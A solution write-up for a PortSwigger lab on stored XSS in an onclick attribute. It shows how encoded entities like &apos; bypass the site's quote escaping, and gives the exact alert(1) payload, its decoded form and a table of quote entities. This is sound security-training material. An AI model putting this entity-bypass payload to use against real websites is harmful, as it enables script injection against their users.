# Lab 20: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

**Category:** Cross-Site Scripting (XSS)  
**Difficulty:** Practitioner  
**Lab link:** [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)

## Overview

The blog comment Website field is stored and reflected inside an `onclick` attribute on the author link. The server HTML-encodes `<>` and `"`, and JS-escapes `'` and `\` — blocking all prior JS-string tricks. But HTML entities bypass the server-side escaping because the browser decodes entities in attribute values before executing the JS.

## Key Concepts

- **HTML entity bypass:** `&apos;` isn't a literal `'` so the server doesn't escape it, but the browser decodes it to `'` before JS execution
- **Processing order:** HTML parser decodes entities → JS engine executes the result
- **Only works in HTML attribute contexts** (`onclick`, `onmouseover`, etc.) — NOT inside `<script>` blocks, which don't get entity-decoded

## Solution

1. Go to any blog post, post a comment with this in the **Website** field:

```
http://foo?&apos;-alert(1)-&apos;
```

2. After posting, click the **author name** on your comment
3. `alert(1)` fires

## Payload Breakdown

The onclick attribute becomes:
```html
onclick="var tracker={track()};tracker.track('http://foo?&apos;-alert(1)-&apos;');"
```

Browser decodes HTML entities first:
```javascript
var tracker={track()};tracker.track('http://foo?'-alert(1)-'');
```

- `'http://foo?'` — string closed by decoded `&apos;`
- `-alert(1)-` — subtraction invokes alert
- `''` — empty string absorbs the trailing quote

## Useful HTML Entities for XSS

| Entity | Character |
|--------|-----------|
| `&apos;` | `'` |
| `&#39;` | `'` |
| `&#x27;` | `'` |
| `&quot;` | `"` |
| `&#34;` | `"` |
